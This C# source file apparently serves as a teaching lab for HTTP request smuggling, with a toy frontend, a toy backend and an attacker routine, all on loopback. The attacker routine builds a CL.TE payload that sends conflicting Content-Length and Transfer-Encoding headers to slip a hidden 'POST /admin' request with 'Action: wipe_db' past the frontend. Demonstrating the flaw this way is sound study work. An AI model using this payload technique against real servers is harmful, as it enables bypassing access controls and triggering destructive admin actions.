using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace SocketReqSmuggling
{
    class TrueHttpSmugglingLab
    {
        static void Main()
        {
            new Thread(StartBackend).Start();
            new Thread(StartFrontend).Start();
            Thread.Sleep(1000);
            RunAttacker();
        }

        // ================= BACKEND (Vulnerable to TE) =================
        static void StartBackend()
        {
            TcpListener server = new TcpListener(IPAddress.Loopback, 9001);
            server.Start();
            Console.WriteLine("[Backend] Listening... (Prioritizes Transfer-Encoding)");

            while (true)
            {
                var client = server.AcceptTcpClient();
                var stream = client.GetStream();
                byte[] buffer = new byte[2048];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string rawData = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                // The Backend looks for Transfer-Encoding: chunked
                if (rawData.Contains("Transfer-Encoding: chunked"))
                {
                    // In chunked encoding, "0\r\n\r\n" marks the absolute end of the request.
                    // The backend splits the TCP stream right here.
                    int endOfChunkIndex = rawData.IndexOf("0\r\n\r\n");

                    if (endOfChunkIndex != -1)
                    {
                        Console.WriteLine("\n[Backend] Processed Request 1 (Chunked Terminator Reached)");

                        // EVERYTHING AFTER "0\r\n\r\n" IS LEFT IN THE TCP BUFFER!
                        // The backend loops around and processes it as the NEXT HTTP request.
                        string remainingData = rawData.Substring(endOfChunkIndex + 5);

                        if (!string.IsNullOrWhiteSpace(remainingData))
                        {
                            Console.WriteLine("\n[Backend] WARNING: Remaining bytes found in TCP pipe. Processing as Request 2...");

                            if (remainingData.StartsWith("POST /admin"))
                            {
                                Console.WriteLine("[Backend] 200 OK - CRITICAL: Smuggled Admin Endpoint Executed!");
                            }
                        }
                    }
                }
                client.Close();
            }
        }

        // ================= FRONTEND (Strict CL Enforcement) =================
        static void StartFrontend()
        {
            TcpListener server = new TcpListener(IPAddress.Loopback, 9000);
            server.Start();
            Console.WriteLine("[Frontend] Listening... (Strict Content-Length Enforcement)");

            while (true)
            {
                var client = server.AcceptTcpClient();
                var clientStream = client.GetStream();
                var backend = new TcpClient("127.0.0.1", 9001);
                var backendStream = backend.GetStream();

                try
                {
                    // STEP 1: Read only the HTTP Headers (stopping exactly at \r\n\r\n)
                    string headers = ReadHeaders(clientStream);
                    if (string.IsNullOrWhiteSpace(headers)) continue;

                    // STEP 2: Parse Content-Length
                    int contentLength = 0;
                    string upperHeaders = headers.ToUpper();
                    int clIndex = upperHeaders.IndexOf("CONTENT-LENGTH:");

                    if (clIndex != -1)
                    {
                        int start = clIndex + 15;
                        int end = upperHeaders.IndexOf("\r\n", start);
                        string clValue = headers.Substring(start, end - start).Trim();
                        contentLength = int.Parse(clValue);
                    }

                    Console.WriteLine($"\n[Frontend] Parsed Headers. Validated Content-Length: {contentLength}");

                    // STEP 3: STRICT BYTE SLICING (The Fix)
                    // We create a buffer exactly the size of the Content-Length and loop 
                    // until we have read every required byte. 
                    byte[] body = new byte[contentLength];
                    int totalRead = 0;

                    while (totalRead < contentLength)
                    {
                        int read = clientStream.Read(body, totalRead, contentLength - totalRead);
                        if (read == 0) break; // Socket closed prematurely
                        totalRead += read;
                    }

                    Console.WriteLine($"[Frontend] Enforced Byte-Slice: Read exactly {totalRead} bytes for the body.");
                    Console.WriteLine("[Frontend] Forwarding reconstructed payload to Backend...");

                    // STEP 4: Forward the reconstructed request as ONE cohesive block
                    // This prevents the backend from reading the headers before the body arrives.
                    byte[] headerBytes = Encoding.UTF8.GetBytes(headers);
                    byte[] fullPayload = new byte[headerBytes.Length + body.Length];

                    Buffer.BlockCopy(headerBytes, 0, fullPayload, 0, headerBytes.Length);
                    Buffer.BlockCopy(body, 0, fullPayload, headerBytes.Length, body.Length);

                    backendStream.Write(fullPayload, 0, fullPayload.Length);

                    // Wait half a second before destroying the TCP connection so the Backend can execute
                    Thread.Sleep(500);
                    client.Close();
                    backend.Close();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[Frontend Error] {ex.Message}");
                }
                finally
                {
                    client.Close();
                    backend.Close();
                }
            }
        }

        // ================= REQUIRED HELPER METHOD =================
        // Safely reads byte-by-byte from the stream until it hits the HTTP header terminator
        static string ReadHeaders(NetworkStream stream)
        {
            System.Collections.Generic.List<byte> headerBytes = new System.Collections.Generic.List<byte>();
            int b;

            while ((b = stream.ReadByte()) != -1)
            {
                headerBytes.Add((byte)b);
                int len = headerBytes.Count;

                // Look for \r\n\r\n (Carriage Return, Line Feed, Carriage Return, Line Feed)
                if (len >= 4 &&
                    headerBytes[len - 4] == '\r' && headerBytes[len - 3] == '\n' &&
                    headerBytes[len - 2] == '\r' && headerBytes[len - 1] == '\n')
                {
                    break;
                }
            }
            return Encoding.UTF8.GetString(headerBytes.ToArray());
        }

        // ================= ATTACKER =================
        static void RunAttacker()
        {
            Thread.Sleep(500);
            var client = new TcpClient("127.0.0.1", 9000);
            var stream = client.GetStream();

            // The Smuggled Request (We want the backend to execute this)
            string smuggledRequest =
                "POST /admin HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Action: wipe_db\r\n\r\n";

            // The body of the outer request. 
            // It contains the chunked terminator (0\r\n\r\n) followed immediately by the smuggled request.
            string maliciousBody = "0\r\n\r\n" + smuggledRequest;

            // The Exploit Payload: Contains BOTH Content-Length and Transfer-Encoding headers.
            string payload =
                "POST / HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                $"Content-Length: {maliciousBody.Length}\r\n" +
                "Transfer-Encoding: chunked\r\n" +
                "\r\n" +
                maliciousBody;

            byte[] data = Encoding.UTF8.GetBytes(payload);
            stream.Write(data, 0, data.Length);

            Console.WriteLine("\n[Attacker] Sent CL.TE Smuggling Payload.");
            client.Close();
        }
    }
}